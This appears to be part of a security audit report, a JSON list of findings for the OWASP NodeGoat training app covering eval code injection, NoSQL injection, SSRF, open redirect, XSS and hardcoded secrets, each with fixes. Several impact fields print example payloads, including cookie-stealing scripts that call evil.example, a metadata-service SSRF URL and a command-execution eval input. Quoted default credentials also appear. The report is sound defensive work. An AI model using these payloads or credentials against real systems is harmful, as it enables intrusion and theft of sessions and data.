+    "evidence": "package.json:41 opens the devDependencies block (lines 42-61 list the 20 packages in it). `npm audit --json`, run against the same lockfile, flags 14 of these as direct-and-vulnerable: async, cypress, grunt, grunt-cli, grunt-contrib-jshint, grunt-contrib-watch, grunt-if, grunt-npm-install, grunt-retire, jshint, mocha, nodemon, selenium-webdriver and zaproxy. Walking each one's via-graph and de-duplicating by advisory URL gives 105 distinct advisories across the group, concentrated in a handful of packages: cypress's subtree alone carries 43, grunt-npm-install's 54 (heavily overlapping with grunt's own 16), zaproxy's 31, and mocha's 13; several individual advisories (e.g. GHSA-9vvw-cc9w-f27h in the shared `debug` dependency, CWE-1333) recur across multiple tools in the group.",
+    "impact": "None of these ship in the application's runtime dependency tree (they install only in a dev/CI install, and package.json's own `dependencies` block is the production set), so this is not a direct application-runtime risk. It is a build/CI supply-chain risk: any of these 105 advisories that is a real exploitable path (several are ReDoS or prototype pollution in packages that process untrusted CI input, e.g. test fixtures or repository content) can compromise the machine running `npm test`/`npm run dev`, and a compromised dev toolchain can inject code into what eventually ships.",
+    "fix": "Treat this as routine dev-tooling maintenance rather than an emergency: run `npm audit fix` scoped to devDependencies where available, and plan the larger jumps (grunt 1.x, cypress 3.x, mocha 2.x are all multiple majors behind current) as their own migration since several of the fixes are marked isSemVerMajor in the audit report.",
+    "references": [
+      "https://cwe.mitre.org/data/definitions/1104.html"
+    ]
+  },
+  {
+    "id": "generalist-session-memorystore-dos",
+    "cwe": "CWE-770",
+    "owasp": "A04:2021 Insecure Design",
+    "severity": "medium",
+    "confidence": "likely",
+    "title": "express-session is mounted with the default in-memory store, saveUninitialized:true, and no cookie expiry, so every visit leaks a session that is never pruned",
+    "file": "server.js",
+    "line": 78,
+    "endLine": 85,
+    "snippet": "app.use(session({\n        // genid: (req) => {\n        //    return genuuid() // use UUIDs for session IDs\n        //},\n        secret: cookieSecret,\n        // Both mandatory in Express v4\n        saveUninitialized: true,\n        resave: true",
+    "evidence": "server.js:78-85 calls express-session with no `store` option, so it falls back to the built-in MemoryStore, which express-session's own documentation states is not intended for production and grows without bound (this specific behavior is documented by the library rather than read in this repo's own source, hence confidence 'likely' rather than 'confirmed'). saveUninitialized is set to true, and the unauthenticated GET routes at app/routes/index.js:30 (\"/\") and :33 (\"/login\") run before any isLoggedIn check, so every visitor - logged in or not - gets a session object created and stored server-side. The commented-out cookie block at server.js:92-100 shows maxAge was never enabled, so nothing ever expires a stored session either. No rate limiter is mounted anywhere in server.js to bound the rate of new sessions.",
+    "impact": "An unauthenticated attacker can repeatedly request any public route (e.g. \"/\") to make the Node process allocate one MemoryStore entry per request indefinitely, exhausting server memory and crashing the process for every user of the application - a remote, unauthenticated denial of service.",
+    "fix": "Configure a bounded, shared session store with TTL-based eviction (e.g. connect-redis, connect-mongo) instead of the default MemoryStore, set saveUninitialized: false so anonymous visits do not create a stored session, and set an explicit cookie.maxAge.",
+    "references": [
+      "https://cwe.mitre.org/data/definitions/770.html",
+      "https://www.npmjs.com/package/express-session#compatible-session-stores"
+    ]
+  },
+  {
+    "id": "injection-eval-contributions",
+    "cwe": "CWE-95",
+    "owasp": "A03:2021 Injection",
+    "severity": "critical",
+    "confidence": "confirmed",
+    "title": "Server-side code injection via eval() on contribution percentages",
+    "file": "app/routes/contributions.js",
+    "line": 32,
+    "endLine": 34,
+    "snippet": "const preTax = eval(req.body.preTax);\n        const afterTax = eval(req.body.afterTax);\n        const roth = eval(req.body.roth);",
+    "evidence": "app/routes/index.js:52 wires POST /contributions to contributionsHandler.handleContributionsUpdate with only the isLoggedIn middleware (no other sanitization) in front of it. handleContributionsUpdate reads req.body.preTax, req.body.afterTax and req.body.roth directly and passes each straight into eval() with no type check or filtering before the value is ever validated; the isNaN() validation that follows at line 47 runs only after the string has already been evaluated as JavaScript, so eval() executes on the raw body value.",
+    "impact": "Any authenticated user can submit a body such as {\"preTax\":\"require('child_process').execSync('id')\",...} to /contributions and have arbitrary JavaScript executed in the Node.js server process, leading to full remote code execution and complete compromise of the application and host.",
+    "fix": "Never eval() request data. Replace eval(req.body.preTax) with Number(req.body.preTax) or parseInt(req.body.preTax, 10) and keep the existing isNaN()/range validation that already runs afterwards.",
+    "references": [
+      "https://cwe.mitre.org/data/definitions/95.html",
+      "https://owasp.org/Top10/A03_2021-Injection/"
+    ]
+  },
+  {
+    "id": "injection-nosql-where-allocations",
+    "cwe": "CWE-943",
+    "owasp": "A03:2021 Injection",
+    "severity": "high",
+    "confidence": "confirmed",
+    "title": "NoSQL injection via unsanitized threshold in MongoDB $where clause",
+    "file": "app/data/allocations-dao.js",
+    "line": 77,
+    "endLine": 79,
+    "snippet": "return {\n                    $where: `this.userId == ${parsedUserId} && this.stocks > '${threshold}'`\n                };",
+    "evidence": "app/routes/allocations.js reads threshold from req.query (line 19-21, GET /allocations/:userId) and passes it unmodified into allocationsDAO.getByUserIdAndThreshold(userId, threshold, ...). Inside getByUserIdAndThreshold, when threshold is truthy it is interpolated verbatim into a MongoDB $where string, which MongoDB compiles and executes as server-side JavaScript for every document in the allocations collection; the developer's own comment two lines above documents the exact injection payloads (0';while(true){}', 1'; return 1 == '1).",
+    "impact": "An authenticated user can supply ?threshold=0';while(true){} to pin the MongoDB server on an infinite loop (denial of service) or supply a boolean-injection payload to extract other users' allocation data field by field, bypassing the intended per-user query.",
+    "fix": "Never build a $where clause from request input. Parse threshold with parseInt and validate it is a bounded number (as the commented-out fix above already shows), then use a plain query operator such as { userId: parsedUserId, stocks: { $gt: parsedThreshold } } instead of $where.",
+    "references": [
+      "https://cwe.mitre.org/data/definitions/943.html",
+      "https://owasp.org/Top10/A03_2021-Injection/"
+    ]
+  },
+  {
+    "id": "injection-ssrf-research",
+    "cwe": "CWE-918",
+    "owasp": "A10:2021 Server-Side Request Forgery",
+    "severity": "critical",
+    "confidence": "confirmed",
+    "title": "Server-side request forgery: research endpoint fetches an attacker-supplied URL",
+    "file": "app/routes/research.js",
+    "line": 15,
+    "endLine": 16,
+    "snippet": "const url = req.query.url + req.query.symbol;\n            return needle.get(url, (error, newResponse, body) => {",
+    "evidence": "GET /research is reachable by any logged-in user (app/routes/index.js:76). req.query.url and req.query.symbol are concatenated with no scheme, host or allowlist check and passed directly to needle.get(url, ...); the returned body is then written back to the client unmodified at line 25 (res.write(body)), so the request/response round trip is fully attacker-controlled.",
+    "impact": "An attacker can make the server issue HTTP requests to arbitrary internal hosts or the cloud metadata service (e.g. ?url=http://169.254.169.254/latest/meta-data/&symbol=) and read the response back through the application, enabling internal network reconnaissance, access to internal-only services, and potential credential theft from cloud metadata endpoints.",
+    "fix": "Do not let the request choose the destination URL. Look symbols up against a fixed, server-configured API endpoint, or if a user-chosen source is required, validate the resolved host against an allowlist and re-check the resolved IP against private/link-local ranges immediately before the request.",
+    "references": [
+      "https://cwe.mitre.org/data/definitions/918.html",
+      "https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/"
+    ]
+  },
+  {
+    "id": "injection-open-redirect-learn",
+    "cwe": "CWE-601",
+    "owasp": "A01:2021 Broken Access Control",
+    "severity": "medium",
+    "confidence": "confirmed",
+    "title": "Open redirect via unvalidated url query parameter",
+    "file": "app/routes/index.js",
+    "line": 72,
+    "snippet": "return res.redirect(req.query.url);",
+    "evidence": "The GET /learn route handler takes req.query.url directly from the querystring and passes it straight to res.redirect() with no allowlist or same-origin check, as the adjacent comment ('Insecure way to handle redirects by taking redirect url from query string') confirms is intentional.",
+    "impact": "An attacker can send a victim a link such as /learn?url=https://evil.example/phish that redirects from the trusted NodeGoat origin to an attacker-controlled site, aiding phishing and credential-theft campaigns.",
+    "fix": "Validate the target against a fixed allowlist of internal paths, or resolve the URL and reject any value whose host does not match the application's own host before calling res.redirect().",
+    "references": [
+      "https://cwe.mitre.org/data/definitions/601.html",
+      "https://owasp.org/Top10/A01_2021-Broken_Access_Control/"
+    ]
+  },
+  {
+    "id": "injection-xss-stored-memos",
+    "cwe": "CWE-79",
+    "owasp": "A03:2021 Injection",
+    "severity": "high",
+    "confidence": "confirmed",
+    "title": "Stored XSS: memo body rendered as raw HTML to every user",
+    "file": "app/views/memos.html",
+    "line": 31,
+    "snippet": "{{ marked(doc.memo) }}",
+    "evidence": "app/routes/memos.js's addMemos passes req.body.memo straight to memosDAO.insert() with no sanitization, and displayMemos renders every stored memo (shared across all users, not scoped per-user) through marked(doc.memo) in this template. server.js:135-142 calls swig.setDefaults({autoescape: false}) globally, so marked's HTML output is written into the page unescaped; marked 0.3.5 (package.json) is the version used, and its `sanitize: true` option (server.js:126-128) is a known-bypassable, deprecated filter, not a real HTML sanitizer.",
+    "impact": "Any authenticated user can post a memo containing HTML/JS (e.g. Markdown that expands to an <img onerror=...> or an inline <script>) that executes in the browser of every other user who views the shared /memos page, enabling session/cookie theft or full account takeover of other users including admins.",
+    "fix": "Sanitize the rendered HTML immediately before output with an allowlist sanitizer such as DOMPurify (server-side via jsdom) or sanitize-html, in addition to re-enabling swig's autoescape; do not rely on marked's deprecated sanitize option.",
+    "references": [
+      "https://cwe.mitre.org/data/definitions/79.html",
+      "https://owasp.org/Top10/A03_2021-Injection/"
+    ]
+  },
+  {
+    "id": "injection-xss-reflected-profile-href",
+    "cwe": "CWE-79",
+    "owasp": "A03:2021 Injection",
+    "severity": "medium",
+    "confidence": "confirmed",
+    "title": "Reflected XSS: unescaped firstName echoed into an href attribute on validation error",
+    "file": "app/views/profile.html",
+    "line": 78,
+    "snippet": "<a href=\"{{firstNameSafeString}}\">Google search this profile by name</a>",
+    "evidence": "app/routes/profile.js:64 sets const firstNameSafeString = firstName directly from req.body.firstName with no encoding, then res.render(\"profile\", {..., firstNameSafeString, ...}) at line 65-76 when the bankRouting regex check fails. swig's autoescape is disabled globally (server.js:135-142), so this template line writes firstNameSafeString straight into the href attribute unescaped.",
+    "impact": "An authenticated user can submit a profile update with an invalid bankRouting value (trivial to trigger) and a firstName such as \"><script>document.location='//evil.example/c?'+document.cookie</script> to have arbitrary markup/script reflected into their own profile page and execute in their browser; combined with the session cookie's missing httpOnly flag this enables session theft.",
+    "fix": "Encode firstNameSafeString for the attribute/URL context in which it is used (ESAPI.encoder().encodeForURL() or an href-safe encoder) before rendering, and re-enable swig's global autoescape instead of relying on ad-hoc per-field encoding.",
+    "references": [
+      "https://cwe.mitre.org/data/definitions/79.html",
+      "https://owasp.org/Top10/A03_2021-Injection/"
+    ]
+  },
+  {
+    "id": "injection-xss-reflected-login-username",
+    "cwe": "CWE-79",
+    "owasp": "A03:2021 Injection",
+    "severity": "medium",
+    "confidence": "confirmed",
+    "title": "Reflected XSS: unvalidated username echoed unescaped on failed login",
+    "file": "app/views/login.html",
+    "line": 110,
+    "snippet": "<input type=\"text\" class=\"form-control\" id=\"userName\" name=\"userName\" value=\"{{userName}}\" placeholder=\"Enter User Name\">",
+    "evidence": "app/routes/session.js:handleLoginRequest reads userName straight from req.body with no format validation (unlike signup, login performs no regex check) and calls userDAO.validateLogin(userName, password, ...). On a 'no such user' result (line 82-89) it re-renders the login page with userName: userName taken verbatim from the request. swig autoescape is globally disabled (server.js:135-142), so the value is written into the value attribute unescaped.",
+    "impact": "An unauthenticated attacker can POST /login with a userName such as \"><script>fetch('//evil.example/c?'+document.cookie)</script> and any password; the login fails but the payload is reflected and executes in the victim's browser, enabling credential or session theft from anyone tricked into submitting the crafted login form.",
+    "fix": "Encode userName for HTML output before rendering (or apply the same regex validation login performs on other fields before echoing it back), and re-enable swig's global autoescape so template variables are escaped by default.",
+    "references": [
+      "https://cwe.mitre.org/data/definitions/79.html",
+      "https://owasp.org/Top10/A03_2021-Injection/"
+    ]
+  },
+  {
+    "id": "platform-insecure-http-transport",
+    "cwe": "CWE-319",
+    "owasp": "A02:2021 Cryptographic Failures",
+    "severity": "high",
+    "confidence": "confirmed",
+    "title": "The server listens on plain HTTP; the session cookie and all credentials travel in cleartext",
+    "file": "server.js",
+    "line": 145,
+    "snippet": "http.createServer(app).listen(port, () => {",
+    "evidence": "The app is started with Node's plain `http` module. The commented-out block at lines 18-28 and 149-155 shows an `https.createServer(httpsOptions, app)` alternative that reads a cert/key pair from `artifacts/cert/`, but it is never used; only the insecure `http.createServer` call at line 145 executes. Login (app/routes/session.js) posts `userName`/`password` in the body and the session id set at server.js:78-102 is exchanged over this same unencrypted channel.",
+    "impact": "Any network intermediary (shared Wi-Fi, a compromised router, an ISP) can read login credentials and the session cookie in transit and hijack any session or replay the credentials.",
+    "fix": "Terminate TLS at the app (uncomment the https.createServer path with a valid certificate) or terminate it at a reverse proxy in front of the app, and redirect all HTTP traffic to HTTPS.",
+    "references": [
+      "https://cwe.mitre.org/data/definitions/319.html"
+    ]
+  },
+  {
+    "id": "platform-session-cookie-flags-missing",
+    "cwe": "CWE-1004",
+    "owasp": "A05:2021 Security Misconfiguration",
+    "severity": "high",
+    "confidence": "confirmed",
+    "title": "Session cookie is issued with no httpOnly, secure or sameSite flag and the default cookie name",
+    "file": "server.js",
+    "line": 78,
+    "endLine": 85,
+    "snippet": "app.use(session({\n    // genid: (req) => {\n    //    return genuuid() // use UUIDs for session IDs\n    //},\n    secret: cookieSecret,\n    // Both mandatory in Express v4\n    saveUninitialized: true,\n    resave: true",
+    "evidence": "The `session()` call passed to app.use has no `cookie` option at all. The commented-out block at lines 86-100 shows the fix that was never applied: a custom `key: \"sessionId\"` to avoid the default `connect.sid` name, and `cookie: { httpOnly: true, secure: true }`. As written, express-session falls back to its defaults: cookie name `connect.sid`, no `HttpOnly`, no `Secure`, no `SameSite`, and no `maxAge` (session-only expiry only, no absolute cap).",
+    "impact": "Because the cookie is not HttpOnly, any script-injection bug in the app (the templating engine's autoescape is also disabled, see the autoescape finding) can read `document.cookie` and exfiltrate the session id; because it is not Secure, the cookie is also sent over the plain-HTTP listener at server.js:145; the default `connect.sid` name additionally fingerprints the framework to an attacker.",
+    "fix": "Set `cookie: { httpOnly: true, secure: true, sameSite: 'lax', maxAge: <a bounded value> }` and a non-default `name` on the session() call.",
+    "references": [
+      "https://cwe.mitre.org/data/definitions/1004.html"
+    ]
+  },
+  {
+    "id": "platform-security-headers-not-mounted",
+    "cwe": "CWE-693",
+    "owasp": "A05:2021 Security Misconfiguration",
+    "severity": "medium",
+    "confidence": "confirmed",
+    "title": "No security-header middleware (helmet) is mounted; CSP, frame options, HSTS and MIME-sniffing protection are absent",
+    "file": "server.js",
+    "line": 68,
+    "snippet": "app.use(favicon(__dirname + \"/app/assets/favicon.ico\"));",
+    "evidence": "This is the first middleware actually mounted in the app.use chain (lines 68-121). Helmet is required at line 10 but the require is commented out (`// const helmet = require(\"helmet\");`), and the whole block at lines 38-65 that would call `app.disable(\"x-powered-by\")`, `helmet.frameguard()`, `helmet.noCache()`, `helmet.contentSecurityPolicy()`, `helmet.hsts()`, and the `dont-sniff-mimetype` middleware (required at line 14, also commented out) is inside a `/* ... */` comment and never executes. No other file in app/routes or server.js sets any of these response headers. `helmet` is present in package.json dependencies but is never applied at runtime.",
+    "impact": "Responses ship with no Content-Security-Policy, no X-Frame-Options (clickjacking is possible by framing any page), no X-Content-Type-Options (MIME-sniffing based XSS is possible), no Strict-Transport-Security, and the `X-Powered-By: Express` header discloses the framework.",
+    "fix": "Uncomment and mount `helmet()` (or its individual middlewares) before the static/session middleware, and call `app.disable('x-powered-by')`.",
+    "references": [
+      "https://cwe.mitre.org/data/definitions/693.html"
+    ]
+  },
+  {
+    "id": "platform-swig-autoescape-disabled",
+    "cwe": "CWE-79",
+    "owasp": "A03:2021 Injection",
+    "severity": "high",
+    "confidence": "confirmed",
+    "title": "The template engine's autoescape is globally disabled, so every view renders untrusted data unescaped",
+    "file": "server.js",
+    "line": 137,
+    "endLine": 141,
+    "snippet": "autoescape: false\n/*\n// Fix for A3 - XSS, enable auto escaping\nautoescape: true // default value\n*/",
+    "evidence": "`swig.setDefaults({ autoescape: false })` is the active statement (line 137); the comment at lines 138-141 shows `autoescape: true` is swig's documented default and the intended fix, but it is inside a block comment and never runs. This setting applies to every `.html` view consolidate.swig renders across the whole app (server.js:116-118), including views that interpolate request-derived data, e.g. `userName`, `loginError` in app/views/login.html via app/routes/session.js, and `error` in app/views/error-template.html via app/routes/error.js.",
+    "impact": "Any value passed into a swig template without manual escaping is emitted verbatim into the HTML response; this turns every reflected value in every view (login errors, signup errors, error pages) into a stored/reflected XSS sink instead of relying on the framework's default protection.",
+    "fix": "Remove the `autoescape: false` override so swig's default `autoescape: true` applies, and audit any template that relied on unescaped output for legitimate HTML (e.g. via marked) to use an explicit `safe`/raw filter only there.",
+    "references": [
+      "https://cwe.mitre.org/data/definitions/79.html"
+    ]
+  },
+  {
+    "id": "platform-csrf-protection-not-mounted",
+    "cwe": "CWE-352",
+    "owasp": "A01:2021 Broken Access Control",
+    "severity": "medium",
+    "confidence": "confirmed",
+    "title": "CSRF protection is never mounted; all state-changing POST routes accept cross-site requests",
+    "file": "server.js",
+    "line": 132,
+    "snippet": "routes(app, db);",
+    "evidence": "`csurf` is required in package.json and imported at the top of server.js (`// const csrf = require('csurf');`, line 7) but that require is commented out, and the block at lines 104-113 that would call `app.use(csrf())` and expose `res.locals.csrftoken` is entirely inside a `/* ... */` comment. Nothing between the session middleware (ending line 102) and the route registration at line 132 adds CSRF protection, so `app/routes/index.js` wires POST /login, /signup, /profile, /contributions, /benefits and /memos (lines 34, 38, 48, 52, 56, 67) with no token check on any of them.",
+    "impact": "A third-party page can submit a cross-site POST to any of these routes using the victim's browser session (e.g. changing benefits allocation or profile data) with no CSRF token required.",
+    "fix": "Uncomment and mount `csrf()` after the session middleware and before route registration, and render the token into every form.",
+    "references": [
+      "https://cwe.mitre.org/data/definitions/352.html"
+    ]
+  },
+  {
+    "id": "platform-error-handler-exposes-error-object",
+    "cwe": "CWE-209",
+    "owasp": "A05:2021 Security Misconfiguration",
+    "severity": "medium",
+    "confidence": "confirmed",
+    "title": "The global error handler renders the raw caught error object into the HTML response",
+    "file": "app/routes/error.js",
+    "line": 10,
+    "endLine": 12,
+    "snippet": "res.render(\"error-template\", {\n    error: err\n});",
+    "evidence": "The handler logs `err.message` and `err.stack` to the server console (lines 7-8) and then also passes the entire `err` object as `error` into the `error-template` view. app/views/error-template.html line 11 renders it directly: `<br>{{error}}`. Because server.js:137 sets `autoescape: false` for swig, this interpolation is not HTML-escaped, so whatever `err.toString()` produces (which includes the internal error message, e.g. a MongoDB or validation error) is written straight into the response body.",
+    "impact": "Internal error messages (which can include library/database details) are returned directly to any client that triggers a 500, aiding reconnaissance, and because output is unescaped, an error message built from attacker-controlled input would also be a reflected-XSS vector.",
+    "fix": "Log the full error server-side only; render a generic message plus a correlation id to the client, and re-enable autoescaping.",
+    "references": [
+      "https://cwe.mitre.org/data/definitions/209.html"
+    ]
+  },
+  {
+    "id": "platform-default-env-is-development",
+    "cwe": "CWE-489",
+    "owasp": "A05:2021 Security Misconfiguration",
+    "severity": "medium",
+    "confidence": "confirmed",
+    "title": "The application defaults to the development configuration, including in the shipped Docker Compose deployment, whenever NODE_ENV is unset",
+    "file": "config/config.js",
+    "line": 5,
+    "snippet": "const finalEnv = process.env.NODE_ENV || \"development\";",
+    "evidence": "config/env/development.js (lines 9-13) unconditionally adds a live-reload `<script>` tag pulling `http://<host>:35729/livereload.js` into `environmentalScripts`, which every view (login.html, signup.html, dashboard, etc., via app/routes/session.js) renders into the page. docker-compose.yml line 7 declares `NODE_ENV:` with no value, so unless the host environment happens to export it, Compose passes an empty string into the container; `process.env.NODE_ENV || \"development\"` treats that empty string as falsy and falls back to \"development\", the same as running with no NODE_ENV set at all.",
+    "impact": "A deployment started via the repository's own `docker-compose up` (or any invocation that forgets to export NODE_ENV) silently runs with development settings: it injects a third-party script tag referencing an internal livereload port into every rendered page, and exposes the hardcoded ZAP proxy API key from config/env/development.js in the loaded config.",
+    "fix": "Make the default fail closed (default to \"production\", or refuse to start without an explicit NODE_ENV), and set NODE_ENV=production explicitly in docker-compose.yml's environment block.",
+    "references": [
+      "https://cwe.mitre.org/data/definitions/489.html"
+    ]
+  },
+  {
+    "id": "secrets-001-cookie-secret",
+    "cwe": "CWE-798",
+    "owasp": "A07:2021 Identification and Authentication Failures",
+    "severity": "high",
+    "confidence": "confirmed",
+    "title": "Session-signing secret is hard-coded in committed config and has no override path",
+    "file": "config/env/all.js",
+    "line": 8,
+    "snippet": "cookieSecret: \"session_cookie_secret_key_here\",",
+    "evidence": "config/env/all.js:8 sets cookieSecret to a literal string. config/config.js:10 merges this file with the environment-specific file (development.js, production.js or test.js) but none of those three files sets cookieSecret, so this literal is the only value that ever reaches the app in any environment, including production. server.js:17 destructures cookieSecret from ./config/config and server.js:82 passes it directly as the `secret` option to express-session with no other source. I read all four config files and server.js's session setup to confirm there is no environment-variable override anywhere in this path.",
+    "impact": "Anyone who has the source (this is a public repository) knows the exact express-session signing secret used by every default deployment. They can forge a validly-signed session cookie for any user id, including the admin account, and gain an authenticated session without credentials.",
+    "fix": "Read cookieSecret from an environment variable or a secrets manager with no hardcoded fallback, generate a strong random value per deployment, and rotate the value that has already been public in this repository's history.",
+    "references": [
+      "https://cwe.mitre.org/data/definitions/798.html",
+      "https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/"
+    ]
+  },
+  {
+    "id": "secrets-002-admin-password",
+    "cwe": "CWE-798",
+    "owasp": "A07:2021 Identification and Authentication Failures",
+    "severity": "critical",
+    "confidence": "confirmed",
+    "title": "Default admin account is seeded with a hard-coded plaintext password on every deploy",
+    "file": "artifacts/db-reset.js",
+    "line": 18,
+    "snippet": "\"password\": \"Admin_123\",",
+    "evidence": "artifacts/db-reset.js:12-21 defines USERS_TO_INSERT with a user \"admin\" (isAdmin: true) whose password field is the plaintext literal \"Admin_123\" (the bcrypt-hashed alternative on line 19 is commented out). app/data/user-dao.js:57-67 shows validateLogin's comparePassword helper does `return fromDB === fromUser;` -- a plain string comparison, with the bcrypt.compareSync fix commented out -- so the seeded plaintext password is exactly what the login route checks against. docker-compose.yml:9 runs `node artifacts/db-reset.js && npm start` on every container start, and app.json:12-14 runs the same script as the Heroku postdeploy hook, so this credential is (re)planted on every default deployment.",
+    "impact": "Anyone who has read this public repository knows the admin username and password for any default NodeGoat deployment and can log in with full admin privileges, with no other precondition.",
+    "fix": "Do not ship a fixed default admin password; generate a random one at first-run and force a change, or require an operator-supplied value with no working default. Store and compare passwords with bcrypt (the commented-out fix in user-dao.js and db-reset.js already shows the correct approach) instead of plaintext equality.",
+    "references": [
+      "https://cwe.mitre.org/data/definitions/798.html",
+      "https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/"
+    ]
+  },
+  {
+    "id": "secrets-003-crypto-key-dead-code",
+    "cwe": "CWE-321",
+    "owasp": "A02:2021 Cryptographic Failures",
+    "severity": "low",
+    "confidence": "possible",
+    "title": "Hard-coded AES key shipped in config for a currently-disabled encryption path",
+    "file": "config/env/all.js",
+    "line": 9,
+    "snippet": "cryptoKey: \"a_secure_key_for_crypto_here\",",
+    "evidence": "config/env/all.js:9-10 sets a literal cryptoKey and cryptoAlgo (\"aes256\"). I read the only two consumers found by grep: app/data/profile-dao.js:15-40, where the createIV/encrypt/decrypt helpers that would use config.cryptoKey are entirely inside a /* ... */ comment block (updateUser at line 42 and getByUserId at line 94 store and return ssn/dob unencrypted, with the encrypt()/decrypt() calls also commented out at lines 67-76 and 100-105), and app/views/tutorial/a6.html:77-115, which is static teaching-page markup showing the same snippet as a \"how to fix this\" example, not executable route code. So this key is not currently reachable from any live request path.",
+    "impact": "No current impact was confirmed, since no live code path performs encryption with this key today -- SSNs and DOBs are stored in plaintext instead (a separate data-exposure issue outside this department's scope). If a developer re-enables the commented block in profile-dao.js without also changing this value, the low-entropy, publicly-known key and the config-wide reused IV shown in the same comment would make the resulting \"encryption\" trivially reversible by anyone with the source.",
+    "fix": "Remove the hardcoded literal; if the encryption feature is ever enabled, derive the key from a secrets manager or environment variable with no working default, and use a fresh random IV per encryption operation instead of a single shared config.iv.",
+    "references": [
+      "https://cwe.mitre.org/data/definitions/321.html",
+      "https://owasp.org/Top10/A02_2021-Cryptographic_Failures/"
+    ]
+  },
+  {
+    "id": "secrets-004-committed-private-key",
+    "cwe": "CWE-321",
+    "owasp": "A02:2021 Cryptographic Failures",
+    "severity": "medium",
+    "confidence": "confirmed",
+    "title": "RSA private key committed to the repository for a currently-disabled HTTPS listener",
+    "file": "artifacts/cert/server.key",
+    "line": 1,
+    "snippet": "-----BEGIN RSA PRIVATE KEY-----",
+    "evidence": "artifacts/cert/server.key is a full committed PEM-encoded RSA private key (I read all 15 lines, header to footer). server.js:18-28 shows a commented-out block that would load exactly this file via `fs.readFileSync(path.resolve(__dirname, \"./artifacts/cert/server.key\"))` together with server.crt, and server.js:149-155 shows the matching commented-out `https.createServer(httpsOptions, app).listen(...)` call; server.js:144-147 confirms the server that actually runs today is plain `http.createServer(app)`. So the key is not loaded by the running server, but it is shipped as source in this public repository regardless.",
+    "impact": "Anyone with read access to the repository (this is the public OWASP NodeGoat project) has this private key. If an operator uncomments the HTTPS block in server.js and deploys with this checked-in key/cert pair unchanged, any attacker who has cloned the repo can decrypt or man-in-the-middle TLS traffic to that server.",
+    "fix": "Remove the private key and certificate from source control, generate a fresh keypair (or obtain one from a real CA / ACME) per deployment, and load it from a mounted secret or certificate manager rather than a path inside the repository.",
+    "references": [
+      "https://cwe.mitre.org/data/definitions/321.html",
+      "https://owasp.org/Top10/A02_2021-Cryptographic_Failures/"
+    ]
+  },
+  {
+    "id": "secrets-005-config-logged-to-stdout",
+    "cwe": "CWE-532",
+    "owasp": "A09:2021 Security Logging and Monitoring Failures",
+    "severity": "medium",
+    "confidence": "confirmed",
+    "title": "Full config object, including the session secret and crypto key, is logged to stdout on every start",
+    "file": "config/config.js",
+    "line": 12,
+    "endLine": 13,
+    "snippet": "console.log(`Current Config:`);\nconsole.log(util.inspect(config, false, null));",
+    "evidence": "config/config.js:10 builds config by spreading allConf (config/env/all.js, which holds the literal cookieSecret confirmed in secrets-001 and cryptoKey confirmed in secrets-003) together with envConf. Lines 12-13, unconditional on NODE_ENV, then log that entire merged object with util.inspect to stdout every time the process starts (server.js and artifacts/db-reset.js both require ./config/config, so this runs on every server boot and every db-reset invocation).",
+    "impact": "Every process start writes the live session-signing secret and crypto key to stdout in plaintext. Procfile runs the app under `forever`, and docker-compose/CI configurations capture container stdout, so any operator, process manager, or log aggregator with access to those logs -- not just the source repo -- obtains the secrets, widening who can reach them beyond source-code readers.",
+    "fix": "Remove the console.log of the full config object, or explicitly redact known-sensitive keys (cookieSecret, cryptoKey) before logging it.",
+    "references": [
+      "https://cwe.mitre.org/data/definitions/532.html",
+      "https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/"
+    ]
+  },
+  {
+    "id": "secrets-006-zap-api-key",
+    "cwe": "CWE-798",
+    "owasp": "A07:2021 Identification and Authentication Failures",
+    "severity": "low",
+    "confidence": "confirmed",
+    "title": "Hard-coded OWASP ZAP API key used by the security-test harness",
+    "file": "config/env/development.js",
+    "line": 6,
+    "snippet": "zapApiKey: \"v9dn0balpqas1pcc281tn5ood1\",",
+    "evidence": "config/env/development.js:6 and config/env/test.js:6 both set the identical literal zapApiKey. test/security/profile-test.js:28 reads it (`var zapApiKey = config.zapApiKey;`) and then uses it as a real credential throughout that file (spider.scan, ascan.scan, context/session calls) to authenticate to the ZAP proxy API at config.zapHostName (192.168.56.20), which is set two lines above at config/env/development.js:3.",
+    "impact": "Anyone with the source can control the local OWASP ZAP proxy instance this test config points at, but this is a development/test-tooling key for a private RFC1918 address, not a production application secret, which bounds the reachable impact to whoever can already reach that internal test host.",
+    "fix": "Read the ZAP API key from an environment variable set on the test runner instead of committing it, and rotate the value if the same ZAP instance or key is ever reused on a network the developer does not fully control.",
+    "references": [
+      "https://cwe.mitre.org/data/definitions/798.html"
+    ]
+  },
+  {
+    "id": "secrets-007-e2e-fixture-admin-password",
+    "cwe": "CWE-798",
+    "owasp": "A07:2021 Identification and Authentication Failures",
+    "severity": "info",
+    "confidence": "confirmed",
+    "title": "Test fixture duplicates the live default admin password",
+    "file": "test/e2e/fixtures/users/admin.json",
+    "line": 3,
+    "snippet": "\"pass\": \"Admin_123\"",
+    "evidence": "test/e2e/fixtures/users/admin.json:2-3 pairs \"admin\" with the plaintext password \"Admin_123\". test/e2e/integration/login_spec.js:34-38 loads this fixture (`cy.fixture(\"users/admin.json\").as(\"admin\")`) and types admin.pass into the login form (line 37) to drive the Cypress e2e suite against a database that artifacts/db-reset.js seeds with the identical password (see secrets-002). This is a lower-severity finding than secrets-002 specifically because this file is a test fixture that only matters to whoever runs the e2e suite, not the primary source of the live credential.",
+    "impact": "On its own this fixture only affects the e2e test run; it does not add new exposure beyond secrets-002, which is the credential actually seeded into the running application's database on every deploy.",
+    "fix": "Apply the same fix as secrets-002 (stop shipping a fixed default admin password); if e2e tests need a known account, generate one per test run instead of committing the literal password in a fixture.",
+    "references": [
+      "https://cwe.mitre.org/data/definitions/798.html"
+    ]
+  }
+]
